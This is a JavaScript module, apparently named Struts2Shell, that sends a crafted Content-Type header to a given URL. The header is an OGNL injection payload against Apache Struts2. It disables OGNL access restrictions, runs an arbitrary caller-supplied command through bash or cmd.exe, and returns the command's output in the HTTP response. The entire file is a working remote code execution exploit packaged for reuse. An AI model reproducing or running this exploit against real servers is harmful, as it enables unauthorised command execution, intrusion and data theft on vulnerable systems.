const request = require('request');

const Struts2Shell = function(options, callback) {
  if(!options.URL) {
    throw new Error('You have to define the URL')
    return;
  }
  if(!options.CMD) {
    throw new Error('You have to define the CMD')
    return;
  }
  options.UserAgent = options.UserAgent | 'Struts2Shell v1.0.0';
  var payload = "Content-Type:%{(#_='multipart/form-data')."
      payload += "(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)."
      payload += "(#_memberAccess?"
      payload += "(#_memberAccess=#dm):"
      payload += "((#container=#context['com.opensymphony.xwork2.ActionContext.container'])."
      payload += "(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class))."
      payload += "(#ognlUtil.getExcludedPackageNames().clear())."
      payload += "(#ognlUtil.getExcludedClasses().clear())."
      payload += "(#context.setMemberAccess(#dm))))."
      payload += "(#cmd='"+options.CMD+"')."
      payload += "(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win')))."
      payload += "(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd}))."
      payload += "(#p=new java.lang.ProcessBuilder(#cmds))."
      payload += "(#p.redirectErrorStream(true)).(#process=#p.start())."
      payload += "(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream()))."
      payload += "(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros))."
      payload += "(#ros.flush())}"

  var requestOptions = {
    url: options.URL,
    headers: {
      'User-Agent': options.UserAgent,
      'Content-Type': payload
    }
  };

  request(requestOptions, function(err, response, body) {
    callback(err, response, body)
  });

}

module.exports = Struts2Shell;